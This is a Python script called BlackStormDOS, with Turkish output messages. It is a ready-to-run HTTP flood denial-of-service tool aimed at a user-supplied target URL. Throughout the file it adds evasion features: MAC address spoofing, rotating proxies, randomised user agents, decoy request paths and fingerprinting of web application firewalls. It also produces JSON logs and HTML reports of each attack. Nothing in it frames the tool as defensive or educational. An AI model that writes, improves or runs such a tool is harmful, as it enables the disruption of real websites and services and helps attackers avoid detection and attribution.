
#!/usr/bin/env python3
# BLACKSTORMDOS - Full Saldırı + Log + Rapor Tek Dosya

import argparse
import requests
import random
import threading
import os
import subprocess
import time
import platform
import json
from datetime import datetime

USER_AGENTS = [
    "Mozilla/5.0", "Chrome/110.0", "Safari/537.36",
    "Edge/91.0", "Opera/9.80", "Firefox/89.0"
]

DECOY_PATHS = ["/about", "/faq", "/contact", "/robots.txt", "/sitemap.xml"]
LOG_FOLDER = "logs"
REPORT_FOLDER = "reports"

def spoof_mac(interface="eth0"):
    if platform.system().lower() == "linux":
        new_mac = "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))
        subprocess.call(["ifconfig", interface, "down"])
        subprocess.call(["ifconfig", interface, "hw", "ether", new_mac])
        subprocess.call(["ifconfig", interface, "up"])
        print(f"[✓] MAC adresi değiştirildi: {new_mac}")
        return new_mac
    return "not_changed"

def restore_mac(interface="eth0"):
    subprocess.call(["ifconfig", interface, "down"])
    subprocess.call(["ifconfig", interface, "hw", "ether", "00:11:22:33:44:55"])
    subprocess.call(["ifconfig", interface, "up"])
    print("[✓] MAC adresi eski haline getirildi.")

def check_ip_leak(proxy=None):
    try:
        session = requests.Session()
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        r = session.get("http://httpbin.org/ip", timeout=5)
        print(f"[IP Leak Test] Dış IP: {r.json()['origin']}")
        return r.json()['origin']
    except Exception:
        print("[!] IP sızıntı testi başarısız.")
        return "unknown"

def detect_waf(target):
    try:
        r = requests.get(target, timeout=5)
        headers = r.headers
        wafs = {
            "cloudflare": "Cloudflare",
            "sucuri": "Sucuri",
            "akamai": "Akamai",
            "aws": "AWS Shield",
            "barracuda": "Barracuda",
            "imperva": "Imperva"
        }
        for k, name in wafs.items():
            for hval in headers.values():
                if k in hval.lower():
                    print(f"[✓] WAF Algılandı: {name}")
                    return name
        if r.status_code in [403, 406, 429]:
            print("[✓] WAF benzeri koruma algılandı.")
            return "Generic WAF"
        else:
            print("[✓] WAF tespit edilmedi.")
            return "None"
    except:
        print("[!] WAF tespiti başarısız.")
        return "error"

def send_attack(target, proxy=None, decoy=False):
    try:
        session = requests.Session()
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        path = random.choice(DECOY_PATHS) if decoy else "/"
        url = target + path
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        session.get(url, headers=headers, timeout=5)
    except:
        pass

def log_attack(result_dict, report_name):
    os.makedirs(LOG_FOLDER, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    filepath = os.path.join(LOG_FOLDER, f"{report_name}.json")
    with open(filepath, "w") as f:
        json.dump(result_dict, f, indent=4)
    print(f"[✓] Log kaydedildi: {filepath}")
    return filepath

def generate_html_report(log_data, report_name):
    os.makedirs(REPORT_FOLDER, exist_ok=True)
    path = os.path.join(REPORT_FOLDER, f"{report_name}.html")
    html = f"""
<!DOCTYPE html>
<html>
<head><meta charset='UTF-8'><title>BlackStormDOS Raporu</title>
<style>
body {{ background:#111; color:#eee; font-family:Arial; padding:20px; }}
h1 {{ color:#00e676; }}
.block {{ margin:10px 0; padding:10px; background:#1e1e1e; border-left:5px solid #00e676; }}
</style></head><body>
<h1>🛡️ BlackStormDOS Raporu</h1>
"""
    for k, v in log_data.items():
        html += f"<div class='block'><b>{k}:</b> {v}</div>"
    html += "</body></html>"
    with open(path, "w") as f:
        f.write(html)
    print(f"[✓] HTML rapor oluşturuldu: {path}")

def start_attack(target, count=1000, threads=100, proxy=None, stealth=False):
    start_time = time.time()
    mac_used = "unchanged"
    ip_info = "unknown"
    waf_info = "unknown"

    if stealth:
        mac_used = spoof_mac()
        ip_info = check_ip_leak(proxy)
        waf_info = detect_waf(target)

    print(f"[•] Saldırı Başlatılıyor: {target} | İstek: {count}")
    thread_list = []
    for i in range(count):
        t = threading.Thread(target=send_attack, args=(target, proxy, i % 10 == 0))
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

    elapsed = round(time.time() - start_time, 2)
    print(f"[✓] Saldırı tamamlandı. Süre: {elapsed}s")

    if stealth:
        restore_mac()

    report_name = f"attack_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    result = {
        "target": target,
        "request_count": count,
        "stealth": stealth,
        "mac_used": mac_used,
        "ip_used": ip_info,
        "waf_status": waf_info,
        "proxy_used": proxy if proxy else "none",
        "duration_sec": elapsed,
        "timestamp": datetime.now().isoformat()
    }
    json_log_path = log_attack(result, report_name)
    generate_html_report(result, report_name)

def show_help():
    print("""
BLACKSTORMDOS - AI STEALTH CYBER ATTACK FRAMEWORK (TAM SÜRÜM)

Kullanım:
  python3 blackstormdos.py --target <URL> [--count 1000] [--stealth] [--proxy proxies.txt]

Parametreler:
  --target     Zorunlu. Hedef URL (örn: https://site.com)
  --count      Gönderilecek istek sayısı (varsayılan: 1000)
  --stealth    IP & MAC gizleme + WAF tespiti aktif eder
  --proxy      Proxy listesi dosyası (her satıra bir proxy)
  --help       Yardım ekranı

Çıktılar:
  logs/     → JSON log kayıtları
  reports/  → HTML rapor dosyaları

Örnek:
  python3 blackstormdos.py --target https://site.com --count 500 --stealth --proxy proxies.txt
""")
    
if __name__ == "__main__":
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("--target", type=str)
    parser.add_argument("--count", type=int, default=1000)
    parser.add_argument("--stealth", action="store_true")
    parser.add_argument("--proxy", type=str)
    parser.add_argument("--help", action="store_true")
    args = parser.parse_args()

    if args.help or not args.target:
        show_help()
    else:
        proxy = None
        if args.proxy and os.path.exists(args.proxy):
            with open(args.proxy, "r") as f:
                proxy = random.choice([line.strip() for line in f if line.strip()])
        start_attack(args.target, args.count, 100, proxy, args.stealth)
